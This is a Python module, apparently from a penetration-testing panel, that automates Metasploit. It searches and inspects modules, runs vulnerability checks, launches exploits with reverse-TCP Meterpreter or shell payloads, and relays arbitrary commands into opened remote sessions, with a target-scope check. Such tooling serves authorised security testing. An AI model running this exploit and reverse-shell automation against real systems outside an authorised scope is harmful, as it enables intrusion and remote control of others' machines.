import re, shutil, subprocess, time, threading, uuid
from .scope import assert_target

class MetasploitError(Exception): pass
MODULE_RE=re.compile(r"^(exploit|auxiliary|post|payload|encoder|nop)/[A-Za-z0-9_./-]+$")
_SESSIONS={}
_PROCS={}
_LOGS={}
_LOCK=threading.Lock()

def _module(module):
    module=str(module or "").strip()
    if not MODULE_RE.fullmatch(module): raise MetasploitError("Invalid Metasploit module name")
    if module.startswith(("post/","payload/","encoder/","nop/")): raise MetasploitError("Only exploit/ or auxiliary/ modules are allowed in this panel")
    return module

def _require(cfg):
    if not shutil.which("msfconsole"): raise MetasploitError("msfconsole is not installed")

def search_modules(cfg, query, limit=20):
    """Search the local Metasploit module metadata without executing a module."""
    _require(cfg); q=re.sub(r"[^A-Za-z0-9_./:-]"," ",str(query or "")).strip()
    if not q: raise MetasploitError("Search query is required")
    limit=max(1,min(int(limit or 20),50))
    p=subprocess.run(["msfconsole","-q","-x",f"search {q}; exit -y"],capture_output=True,text=True,timeout=180,check=False)
    # Metasploit's search table has a module path in a dedicated column.
    # Extract only real module paths so callers do not mistake descriptions or
    # table headers for modules.
    paths=[]
    seen=set()
    path_re=re.compile(r"(?:^|\s)((?:exploit|auxiliary|post|payload|encoder|nop)/[A-Za-z0-9_./-]+)(?:\s|$)")
    for line in p.stdout.splitlines():
        m=path_re.search(line.strip())
        if not m:
            continue
        module=m.group(1)
        if module not in seen:
            seen.add(module); paths.append(module)
    return {"query":q,"returncode":p.returncode,"modules":paths[:limit],"stdout":p.stdout[-12000:],"stderr":p.stderr[-4000:]}

def _classify_check(output, returncode):
    low=output.lower()
    # Negative phrases are checked first: 'not vulnerable' contains 'vulnerable'.
    negative=("not vulnerable","not-vulnerable","safe","not detected","does not appear","appears to be safe","check failed")
    positive=("is vulnerable","appears to be vulnerable","target is vulnerable","vulnerable!")
    if any(x in low for x in negative): return "NOT_VULNERABLE"
    if any(x in low for x in positive): return "VULNERABLE"
    return "UNKNOWN"

_OPTIONS_CACHE = {}
_INFO_CACHE = {}

def module_options(cfg, module):
    """Read a module's datastore options without executing it."""
    _require(cfg); module=_module(module)
    if module in _OPTIONS_CACHE:
        return dict(_OPTIONS_CACHE[module])
    cmd=["msfconsole","-q","-x",f"use {module}; show options; exit -y"]
    p=subprocess.run(cmd,capture_output=True,text=True,timeout=120,check=False)
    output=(p.stdout+"\n"+p.stderr)[-24000:]
    names=set()
    # Metasploit option tables put the option name at the start of a row.
    for line in output.splitlines():
        m=re.match(r"^\s*([A-Z][A-Z0-9_]{1,31})\s+", line)
        if m:
            names.add(m.group(1))
    opts={"module":module,"options":sorted(names),"output":output,"returncode":p.returncode}
    _OPTIONS_CACHE[module]=opts
    return dict(opts)

def module_info(cfg, module):
    """Read module metadata without executing the module."""
    _require(cfg); module=_module(module)
    if module in _INFO_CACHE:
        return dict(_INFO_CACHE[module])
    cmd=["msfconsole","-q","-x",f"info {module}; exit -y"]
    p=subprocess.run(cmd,capture_output=True,text=True,timeout=120,check=False)
    output=(p.stdout+"\n"+p.stderr)[-30000:]
    def field(name):
        m=re.search(rf"(?im)^\s*{re.escape(name)}\s*:\s*(.+?)\s*$", output)
        return m.group(1).strip() if m else ""
    check_raw=field("Check")
    check_yes=bool(re.search(r"(?i)\b(yes|true|supported)\b", check_raw))
    check_no=bool(re.search(r"(?i)\b(no|false|unsupported)\b", check_raw))
    platform_raw=field("Platform")
    platforms=[x.strip().lower() for x in re.split(r"[,/]+", platform_raw) if x.strip()]
    rank=field("Rank")
    info={"module":module,"check_supported":check_yes and not check_no,"check_raw":check_raw,
          "platform_raw":platform_raw,"platforms":platforms,"rank":rank,"output":output,"returncode":p.returncode}
    _INFO_CACHE[module]=info
    return dict(info)


def module_check_supported(cfg, module):
    return bool(module_info(cfg,module).get("check_supported"))


def module_platforms(cfg, module):
    return list(module_info(cfg,module).get("platforms") or [])


def _platform_compatible(target_platform, module_platforms_list):
    target=str(target_platform or "unknown").lower()
    mods={str(x).lower() for x in module_platforms_list or []}
    if target in {"", "unknown"}:
        return True
    if not mods:
        return False
    if "multi" in mods or target in mods:
        return True
    aliases={"windows":{"windows","win"},"linux":{"linux","unix"},"unix":{"unix","linux"},"macos":{"osx","macos","darwin"},"android":{"android","linux"}}
    return bool(aliases.get(target,{target}) & mods)


def _remote_target_option(cfg, module):
    """Return the correct remote target datastore key for a module."""
    opts=module_options(cfg,module).get("options",[])
    if "RHOSTS" in opts:
        return "RHOSTS"
    if "RHOST" in opts:
        return "RHOST"
    raise MetasploitError("Selected module has no RHOST/RHOSTS option; it is not a remote target module")

def check_module(cfg,target,module,rport=None):
    assert_target(cfg,target); _require(cfg); module=_module(module)
    if module.startswith("exploit/" ) and ("/local/" in module or module.startswith("exploit/multi/local/")):
        raise MetasploitError("Local privilege-escalation modules require an existing session and are not valid Target Inventory remote candidates")
    target_key=_remote_target_option(cfg,module)
    commands=["use "+module,f"set {target_key} {target}"]
    if rport not in (None, ""):
        if not str(rport).isdigit() or not (1<=int(rport)<=65535):
            raise MetasploitError("Invalid RPORT")
        commands.append(f"set RPORT {int(rport)}")
    commands += ["check","exit -y"]
    cmd=["msfconsole","-q","-x","; ".join(commands)]
    started=time.time(); p=subprocess.run(cmd,capture_output=True,text=True,timeout=300,check=False)
    output=(p.stdout+"\n"+p.stderr)[-16000:]
    return {"target":target,"module":module,"target_option":target_key,"rport":int(rport) if str(rport or "").isdigit() else None,"status":_classify_check(output,p.returncode),"command":cmd,"returncode":p.returncode,"output":output,"elapsed_sec":round(time.time()-started,2),"checked_at":time.time()}

ALLOWED_PAYLOADS={
    "windows/x64/meterpreter/reverse_tcp",
    "windows/x64/shell/reverse_tcp",
    "linux/x64/meterpreter/reverse_tcp",
    "linux/x64/shell/reverse_tcp",
}

def run_module(cfg,target,module,lhost,lport=4444,payload="windows/x64/meterpreter/reverse_tcp",rport=None):
    assert_target(cfg,target); _require(cfg); module=_module(module)
    target_key=_remote_target_option(cfg,module)
    if not lhost or any(c in str(lhost) for c in "\r\n;&|`$"): raise MetasploitError("Invalid LHOST")
    if not str(lport).isdigit() or not (1<=int(lport)<=65535): raise MetasploitError("Invalid LPORT")
    if rport not in (None, "") and (not str(rport).isdigit() or not (1<=int(rport)<=65535)):
        raise MetasploitError("Invalid RPORT")
    if payload not in ALLOWED_PAYLOADS: raise MetasploitError("Unsupported payload profile")
    commands=[f"use {module}",f"set {target_key} {target}"]
    if rport not in (None, ""): commands.append(f"set RPORT {int(rport)}")
    commands += [f"set LHOST {lhost}",f"set LPORT {int(lport)}",f"set PAYLOAD {payload}","run -j"]
    resource="\n".join(commands)+"\n"
    sid=uuid.uuid4().hex[:10]; log_path=f"/tmp/asep-msf-{sid}.log"
    log=open(log_path,"w",encoding="utf-8")
    proc=subprocess.Popen(["msfconsole","-q"],stdin=subprocess.PIPE,stdout=log,stderr=subprocess.STDOUT,text=True,start_new_session=True)
    proc.stdin.write(resource); proc.stdin.flush()
    with _LOCK:
        _SESSIONS[sid]={"id":sid,"target":target,"module":module,"payload":payload,"lhost":lhost,"lport":int(lport),"rport":int(rport) if str(rport or "").isdigit() else None,"pid":proc.pid,"log":log_path,"started_at":time.time()}
        _PROCS[sid]=proc
        _LOGS[sid]=log
    return {"target":target,"module":module,"payload":payload,"lhost":lhost,"lport":int(lport),"rport":int(rport) if str(rport or "").isdigit() else None,"session_controller":sid,"pid":proc.pid,"status":"STARTED","log":log_path}

def refresh_session(sid):
    with _LOCK:
        meta=_SESSIONS.get(str(sid)); proc=_PROCS.get(str(sid))
    if not meta or not proc:
        raise MetasploitError("Unknown Metasploit controller session")
    if proc.poll() is not None:
        return {"id":str(sid),"controller_alive":False,"output":"Metasploit controller has exited."}
    proc.stdin.write("sessions -l\n")
    proc.stdin.flush()
    time.sleep(0.5)
    try:
        with open(meta["log"],"r",encoding="utf-8",errors="replace") as fh:
            output=fh.read()[-12000:]
    except OSError:
        output=""
    return {"id":str(sid),"controller_alive":True,"output":output}

def list_sessions():
    out=[]
    with _LOCK:
        for sid,meta in list(_SESSIONS.items()):
            alive=bool(shutil.which("ps") and subprocess.run(["ps","-p",str(meta["pid"])],capture_output=True).returncode==0)
            row=dict(meta); row["controller_alive"]=alive
            out.append(row)
    return out

def _validate_remote_session_id(value):
    sid=str(value or '').strip()
    if not sid.isdigit() or not (1 <= int(sid) <= 99999):
        raise MetasploitError('Invalid remote session ID')
    return sid

def _read_log(path, limit=16000):
    try:
        with open(path, 'r', encoding='utf-8', errors='replace') as fh:
            return fh.read()[-limit:]
    except OSError:
        return ''

def remote_sessions(controller_id):
    """Refresh controller output and parse remote Metasploit sessions."""
    info=refresh_session(controller_id)
    output=info.get('output','')
    sessions=[]
    # Typical msfconsole table: "1  meterpreter x64/windows ..."
    for line in output.splitlines():
        m=re.match(r'^\s*(\d+)\s+(meterpreter|shell|powershell|python|cmd|generic)\s+(.+?)\s*$', line, re.I)
        if m:
            sessions.append({'id':m.group(1),'type':m.group(2),'detail':m.group(3).strip()})
    info['sessions']=sessions
    return info

def interact_session(controller_id, remote_id, command):
    """Send a command to a remote Metasploit session through its persistent controller."""
    remote_id=_validate_remote_session_id(remote_id)
    command=str(command or '').replace('\x00','').strip()
    if not command:
        raise MetasploitError('Session command is required')
    if len(command)>2000:
        raise MetasploitError('Session command is too long')
    with _LOCK:
        meta=_SESSIONS.get(str(controller_id)); proc=_PROCS.get(str(controller_id))
    if not meta or not proc:
        raise MetasploitError('Unknown Metasploit controller session')
    if proc.poll() is not None:
        raise MetasploitError('Metasploit controller has exited')
    # Keep command transport on the existing controller stdin; do not invoke a shell.
    sequence=f'sessions -i {remote_id}\n{command}\nbackground\n'
    try:
        proc.stdin.write(sequence)
        proc.stdin.flush()
    except Exception as exc:
        raise MetasploitError(f'Unable to write to Metasploit controller: {exc}')
    time.sleep(0.6)
    output=_read_log(meta['log'])
    return {'controller_id':str(controller_id),'session_id':remote_id,'command':command,'output':output,'controller_alive':proc.poll() is None}
